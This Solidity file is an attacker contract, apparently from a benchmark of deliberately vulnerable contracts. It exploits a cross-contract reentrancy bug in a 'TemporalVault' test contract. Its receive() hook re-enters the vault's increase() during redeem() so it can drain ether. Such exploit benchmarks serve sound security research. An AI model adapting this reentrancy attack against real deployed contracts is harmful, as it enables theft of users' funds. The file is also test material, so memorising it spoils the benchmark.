// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../cross-contract/access-control/temporal/TemporalVault_ree1.sol";

// Contract C contains a cross-contract reentrancy vulnerability that can be exploited by an attacker.
// Specifically, the attacker can enter the TemporalVault_ree1_Vault contract and invoke the `increase` function
// during the execution of the `redeem` function, which pays back funds. This allows the attacker
// to manipulate the contract's state and potentially drain funds.

contract TemporalVault_ree1_Attacker {
    TemporalVault_ree1_Vault public immutable vault;
    TemporalVault_ree1 public immutable c;
    bool flag = true;

    constructor(address _vault, address payable _c) {
        vault = TemporalVault_ree1_Vault(_vault);
        c = TemporalVault_ree1(_c);
    }

    function attack() public payable {
        (bool success, ) = address(c).call{value: 1 ether}("");
        require(success);
        c.redeem(payable(address(this)));
        c.redeem(payable(address(this))); // the second redeem() will pay 1000
    }

    receive() external payable {
        if (flag) {
            flag = false;
            vault.increase(address(this), 2 ether);
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
